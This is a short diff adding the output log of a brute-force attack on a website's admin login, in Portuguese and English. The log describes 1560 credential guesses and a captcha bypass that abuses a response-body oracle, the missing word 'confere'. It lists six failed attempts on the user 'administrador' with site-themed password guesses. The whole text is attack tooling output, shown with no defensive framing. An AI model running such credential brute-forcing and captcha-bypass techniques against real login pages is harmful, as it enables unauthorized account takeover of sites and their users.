@@ -1,0 +1,8 @@
+[*] admin login ORACULO brute — 26 users x 60 passes = 1560 tentativas
+[*] Oraculo: body SEM 'confere' = cred certa (captcha bypass via ordem de validacao)
+  [0001] 'administrador'          :'Desapego@2024'           -> HTTP 200 confere=True 
+  [0002] 'administrador'          :'Desapego@2023'           -> HTTP 200 confere=True 
+  [0003] 'administrador'          :'Desapego@2022'           -> HTTP 200 confere=True 
+  [0004] 'administrador'          :'Desapego@2025'           -> HTTP 200 confere=True 
+  [0005] 'administrador'          :'desapego2024'            -> HTTP 200 confere=True 
+  [0006] 'administrador'          :'desapego2023'            -> HTTP 200 confere=True 
